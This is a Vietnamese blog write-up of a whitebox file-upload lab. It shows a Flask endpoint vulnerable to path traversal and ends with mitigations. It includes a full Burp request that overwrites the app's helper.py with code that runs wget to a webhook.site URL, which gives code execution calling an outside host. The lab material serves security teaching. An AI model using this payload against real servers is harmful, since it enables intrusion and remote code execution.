<!DOCTYPE html>
<html lang="en">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>
        
        File Upload Challenge | Cuýt
        
    </title>
    <link rel="stylesheet" href="/css/normalize.min.css">
    <link rel="stylesheet" href="/css/bootstrap-grid-5.3.8.css">
    <link rel="stylesheet" href="/css/fontawesome-7.1.0/css/all.min.css">
    
    <link rel="stylesheet" href="/css/syntax.min.c75db92330d165065b4cef68bb3da371b54ad6f746e9e9047ea56f286749850b.css" integrity="sha256-x125IzDRZQZbTO9ouz2jcbVK1vdG6ekEfqVvKGdJhQs=">
    <link rel="icon" type="image/png" href="/images/favicon-96x96.png" sizes="96x96" />
    <link rel="icon" type="image/svg+xml" href="/images/favicon.svg" />
    <link rel="shortcut icon" href="/images/favicon.ico" />
    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png" />
    <meta name="apple-mobile-web-app-title" content="blog của Cuýt" />
    <link rel="manifest" href="/images/site.webmanifest" />
    <link rel="preload" href="/fonts/JetBrainsMono/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin>
    <script src="/js/fuse.basic.min.js"></script>
    
    <link rel="stylesheet" href="/css/style.min.9f32ab66b8df7dd8aa2d8ff501d516e1964d05571a88aad71c8ed047ea5d603e.css" integrity="sha256-nzKrZrjffdiqLY/1AdUW4ZZNBVcaiKrXHI7QR&#43;pdYD4="><meta name="description" content="Báo cáo Task 4.1: File upload Challenge lab whitebox http://113.171.248.61:8008/ Source code đính kèm
Ta được cung cấp một source code Python, định nghĩa một …"></head>
<body>
    <main id="main" role="main">
        <header id="main-header">
  <div class="container container-narrow">
    <div class="row align-items-center">
      <div class="col-3 col-md-2 col-lg-3">
        <div class="main-header__homepage">
          <a href="/" class="main-header__hompage-link">Cuýt</a>
        </div>
      </div>

      <div class="col-12 col-md-6 col-lg-6 main-header__navbar-wrapper">
        <nav class="main-header__navbar" aria-label="Main navigation">
          <ul class="main-header__navbar-list">
            <li><a href="/">Blog</a></li>
            <li><a href="/categories">Categories</a></li>
            <li><a href="/archives">Archives</a></li>
            <li><a href="/about">About</a></li>
          </ul>
        </nav>
      </div>

      <div class="col-9 col-md-4 col-lg-3">
        <div class="main-header__btn">
          <div class="main-header_search-wrapper">
            <i class="fa-solid fa-magnifying-glass main-header__search-icon" aria-hidden="true"></i>
            <input type="text" class="main-header__search-box" placeholder="Search..." aria-label="Search">
            <ul id="main_header__search-results"></ul>
          </div>

          <button class="main-header__btn-toggle-theme" type="button" aria-label="Toggle theme">
            <i class="fa-solid fa-moon" aria-hidden="true"></i>
          </button>

          <button class="main-header__btn-mobile-bar" type="button" aria-label="Open menu" aria-expanded="false" aria-controls="main-header-mobile-menu">
            <i class="fa-solid fa-bars" aria-hidden="true"></i>
          </button>
        </div>
      </div>
    </div>

    <div id="main-header-mobile-menu" class="main-header__mobile-menu" hidden>
    <nav aria-label="Mobile navigation">
        <ul class="main-header__mobile-menu-list">
        <li><a href="/">Blog</a></li>
        <li><a href="/categories">Categories</a></li>
        <li><a href="/archives">Archives</a></li>
        <li><a href="/about">About</a></li>
        </ul>
    </nav>
    </div>
  </div>
</header>

        <div id="main-content" class="container container-narrow">
            
    <div class="row">
        <article class="main-content__article-detail col-lg-9">
            
                
                <div class="main-content__article-cover">
                    
                </div>
            
        
            <header class="main-content__article-header">
                <h1 class="main-content__article-title">
                    File Upload Challenge
                </h1>
                <div class="main-content__article-meta mt-3">
                    <span>
                        <i class="fa-solid fa-hashtag"></i>
                        
                            
                                
                                <a class="main-content__article-meta-category-link" href="/categories/security">
                                    Security
                                </a>
                            
                                , 
                                <a class="main-content__article-meta-category-link" href="/categories/file-uploads-vulnerabilities">
                                    File uploads vulnerabilities
                                </a>
                            
                        
                    </span>
                    <span class=""><i class="fa-regular fa-calendar"></i> 28/12/2025</span>
                    <span class=""><i class="fa-regular fa-clock"></i> 2 mins read</span>
                </div>
            </header>
        
            
            
            
            
            
            
            
            
            
            <div class="main-content__article-body-content">
                <h1 id="báo-cáo-task-41-file-upload">Báo cáo Task 4.1: File upload</h1>
<h2 id="challenge-lab-whitebox">Challenge lab whitebox</h2>
<blockquote>
<p>http://113.171.248.61:8008/
Source code đính kèm</p>
</blockquote>
<p>Ta được cung cấp một source code Python, định nghĩa một endpoint <code>/uploader</code> cho phép user upload thông qua method POST. Dựa vào những gì đề bài cho, ta chỉ có thể upload một file để tấn công</p>
<h2 id="phân-tích-challenge">Phân tích challenge</h2>
<p>Đáng chú ý nhất trong source code là đoạn này</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">file_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">UPLOAD_FOLDER</span><span class="p">,</span> <span class="n">f</span><span class="o">.</span><span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">file_path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="kn">from</span> <span class="nn">utils</span> <span class="kn">import</span> <span class="n">helper</span>
</span></span><span class="line"><span class="cl">    <span class="n">helper</span><span class="o">.</span><span class="n">rename_file</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">UPLOAD_FOLDER</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;num_file&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="s1">&#39;.txt&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;Lỗi xử lý file: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Trong đó sử dụng <code>os.path.join()</code>, developer đã truyền trực tiếp <code>f.filename</code> của người dùng vào thẳng <code>UPLOAD_FOLDER</code>. Từ đây, ta biết chắc chắn có thể tấn công Path Traversal. Chỉ bằng cách thay đổi tên của <code>f.filename</code></p>
<p>Ngoài ra, trong challenge này, có lẽ hàm <code>f.save()</code> mặc định sẽ replace file đang có bằng file mới cùng tên (file của attacker gửi lên).</p>
<p>Khi đọc kĩ source, ta sẽ thấy developer có viết thêm một file tên là <code>helper.py</code> trong thư mục <code>../utils</code>, trong file này có hàm <code>rename_file</code>. Giờ ta sẽ viết lại file <code>helper.py</code> để ghi đè hàm <code>rename_file</code> gọi về webhook của ta</p>
<h2 id="tấn-công-thử">Tấn công thử</h2>
<p>Kết hợp Path Traversal và File Upload theo như phân tích ta đã biết ở trên kia, dưới đây là Request gửi từ Burp Suite</p>
<pre tabindex="0"><code>POST /uploader HTTP/1.1
Host: 113.171.248.61:8008
Content-Length: 622
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Origin: http://113.171.248.61:8008
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykggKjwOlZ9TcAUwi
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://113.171.248.61:8008/
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJudW1fZmlsZSI6MX0.aCQ98Q.3YlntWqlPEEqwf5vIut5BBSCAts
Connection: keep-alive

------WebKitFormBoundarykggKjwOlZ9TcAUwi
Content-Disposition: form-data; name=&#34;files&#34;; filename=&#34;../utils/helper.py&#34;
Content-Type: text/plain

import os

def rename_file(a, b):
    try:
        # Try wget as an alternative to curl
        os.system(&#34;wget -qO- https://webhook.site/a4a258a3-5789-48a7-a1b3-64a1b4e78ab9&#34;)
        # Try using ping as a fallback method to trigger the webhook
        os.system(&#34;ping -c 1 webhook.site&#34;)
        print(&#34;Webhook attempt made via wget and ping&#34;)
    except Exception as e:
        print(f&#34;Error calling webhook: {e}&#34;)

------WebKitFormBoundarykggKjwOlZ9TcAUwi--
</code></pre><p>với header dưới đây để ghi đè file <code>helper.py</code> sử dụng Path Traversal.</p>
<pre tabindex="0"><code>Content-Disposition: form-data; name=&#34;files&#34;; filename=&#34;../utils/helper.py&#34;
</code></pre><p>Và khi thử lại với webhook, ta thấy đã thành công gửi request về webhook của ta

  
<figure class="image-container">
  <a href="https://hackmd.io/_uploads/HJKZXTWbxe.png" 
     class="lightbox-trigger" 
     >
      <img src="https://hackmd.io/_uploads/HJKZXTWbxe.png" 
           
           alt="image" 
           class="main-content__article-body-img" 
           loading="lazy" 
      />
  </a>
  
  
</figure></p>
<h2 id="tổng-kết">Tổng kết</h2>
<p>Vậy khi đã có thể call tới webhook rồi, ta cũng có thể RCE, leo quyền hệ thống, &hellip;</p>
<p>Để ngăn chặn lỗ hổng này, ta có thể áp dụng: check tên file, loại file, chỉ định thư mục upload cụ thể, container hoá app, v.v&hellip;</p>
<h2 id="tham-khảo">Tham khảo</h2>
<p><a href="https://samy.blog/rtfm/">https://samy.blog/rtfm/</a></p>

            </div>
        
            <div class="article-footer mt-5 pt-4" style="font-size: smaller;">
                <p>Thanks for your reading!</p>
                <p>© 2026 <strong>izcuyt.com</strong>. Some rights reserved.</p>
            </div>
        </article>
        <aside class="main-content__article-panel col-lg-3">
            
            
            <div class="main-content__article-panel-same-category-post">
                <h3 class="main-content__article-panel-heading">
                    <i class="fa-regular fa-newspaper"></i>Related articles
                </h3>
                <ul class="main-content__article-panel-list">
                    
                        <li class="main-content__article-panel-item">
                            <a class="main-content__article-panel-item-link" href="/2026/01/writeup-web-cybersecurity-student-contest-vietnam-2025/" title="Writeup (Web) Cybersecurity Student Contest Vietnam 2025">
                                <span class="main-content__article-panel-item-text">Writeup (Web) Cybersecurity Student Contest Vietnam 2025</span>
                            </a>
                        </li>
                    
                        <li class="main-content__article-panel-item">
                            <a class="main-content__article-panel-item-link" href="/2025/12/tim-hieu-ve-sql-injection-va-cach-phong-chong/" title="Tìm hiểu về SQL injection và cách phòng chống">
                                <span class="main-content__article-panel-item-text">Tìm hiểu về SQL injection và cách phòng chống</span>
                            </a>
                        </li>
                    
                </ul>
            </div>
            

            <div class="main-content__article-panel-categories">
                <h3 class="main-content__article-panel-heading">
                    <i class="fa-solid fa-hashtag"></i> Categories
                </h3>
                <ul class="main-content__article-panel-list">
                    
                        <li class="main-content__article-panel-item">
                            <a class="main-content__article-panel-item-link" href="/categories/ctf">
                                
                                <span class="main-content__article-panel-item-text">CTF</span>
                                <span class="main-content__article-panel-item-text cat-count">(1)</span>
                            </a>
                        </li>
                    
                        <li class="main-content__article-panel-item">
                            <a class="main-content__article-panel-item-link" href="/categories/file-uploads-vulnerabilities">
                                
                                <span class="main-content__article-panel-item-text">File Uploads Vulnerabilities</span>
                                <span class="main-content__article-panel-item-text cat-count">(1)</span>
                            </a>
                        </li>
                    
                        <li class="main-content__article-panel-item">
                            <a class="main-content__article-panel-item-link" href="/categories/security">
                                
                                <span class="main-content__article-panel-item-text">Security</span>
                                <span class="main-content__article-panel-item-text cat-count">(3)</span>
                            </a>
                        </li>
                    
                        <li class="main-content__article-panel-item">
                            <a class="main-content__article-panel-item-link" href="/categories/sql">
                                
                                <span class="main-content__article-panel-item-text">SQL</span>
                                <span class="main-content__article-panel-item-text cat-count">(1)</span>
                            </a>
                        </li>
                    
                        <li class="main-content__article-panel-item">
                            <a class="main-content__article-panel-item-link" href="/categories/web">
                                
                                <span class="main-content__article-panel-item-text">Web</span>
                                <span class="main-content__article-panel-item-text cat-count">(1)</span>
                            </a>
                        </li>
                    
                        <li class="main-content__article-panel-item">
                            <a class="main-content__article-panel-item-link" href="/categories/writeups">
                                
                                <span class="main-content__article-panel-item-text">Writeups</span>
                                <span class="main-content__article-panel-item-text cat-count">(1)</span>
                            </a>
                        </li>
                    
                </ul>
            </div>

            
                <div class="main-content__article-panel-toc">
                    <h3 class="main-content__article-panel-heading">
                        <i class="fa-regular fa-rectangle-list"></i>Contents
                    </h3>
                    <nav id="TableOfContents">
  <ul>
    <li><a href="#challenge-lab-whitebox">Challenge lab whitebox</a></li>
    <li><a href="#phân-tích-challenge">Phân tích challenge</a></li>
    <li><a href="#tấn-công-thử">Tấn công thử</a></li>
    <li><a href="#tổng-kết">Tổng kết</a></li>
    <li><a href="#tham-khảo">Tham khảo</a></li>
  </ul>
</nav>
                </div>
            

        </aside>
    </div>

        </div>

        <footer id="main-footer" class="pt-4 pb-4">
    <div class="container container-narrow border-top main-footer__wrapper">
        <div class="row">
            <div class="col-lg-5">
                <div class="footer-brand">
                    <h2 class="footer-brand__name">>_ izcuyt.com</h2>
                    <p class="footer-brand__desc">
                        Aspiring Web Pentester<br>Sharing security knowledge about Cyber Security.
                        <br><br>
                        Made by <b>@cuyt</b> with love. ♥️
                    </p>
                </div>
                <div class="main-footer__footer-socials">
                    <a href="https://github.com/quyt0"
                        target="_blank" rel="noopener"
                        class="footer-social-btn"
                        aria-label="GitHub profile">
                        <i class="fa-brands fa-github" aria-hidden="true"></i>
                    </a>
                    <a href="https://www.facebook.com/100024860571867"
                        target="_blank" rel="noopener"
                        class="footer-social-btn"
                        aria-label="Facebook profile">
                        <i class="fa-brands fa-facebook" aria-hidden="true"></i>
                    </a>

                    <a href="https://www.instagram.com/koanbunbo/"
                        target="_blank" rel="noopener"
                        class="footer-social-btn"
                        aria-label="Instagram profile">
                        <i class="fa-brands fa-instagram" aria-hidden="true"></i>
                    </a>

                    <a href="https://www.linkedin.com/in/doanduyphuc/"
                        target="_blank" rel="noopener"
                        class="footer-social-btn"
                        aria-label="LinkedIn profile">
                        <i class="fa-brands fa-linkedin" aria-hidden="true"></i>
                    </a>

                    <a href="mailto:dphuc2304@gmail.com"
                        class="footer-social-btn"
                        aria-label="Send email to dphuc2304@gmail.com">
                        <i class="fa-solid fa-envelope" aria-hidden="true"></i>
                    </a>

                    </div>
            </div>

            <div class="col-lg-1 d-none d-lg-block">
                <div class="footer-divider"></div>
            </div>

            <div class="col-6 col-lg-3">
                <h3 class="footer-title">This site</h3>
                <ul class="footer-list">
                    <li><a href="/">Blog</a></li>
                    <li><a href="/categories">Categories</a></li>
                    <li><a href="/archives">Archives</a></li>
                </ul>
            </div>

            <div class="col-6 col-lg-3">
                <h3 class="footer-title">Connect</h3>
                <ul class="footer-list">
                    <li><a href="/cv">Resume</a></li>
                    <li><a href="mailto:dphuc2304@gmail.com">Email</a></li>
                </ul>
            </div>
        </div>
    </div>
</footer>
    </main>
    <div id="lightbox-overlay" class="lightbox-overlay">
        <span class="lightbox-close">&times;</span>
        <img class="lightbox-content" id="lightbox-img">
        <div id="lightbox-caption"></div>
    </div>
    
    <script src="/js/script.min.7c8827ed031431dc353d44474f721aff9bc71ab4a1d70a149f3b4d68eb775164.js" integrity="sha256-fIgn7QMUMdw1PURHT3Ia/5vHGrSh1woUnztNaOt3UWQ=" defer></script>
</body>
</html>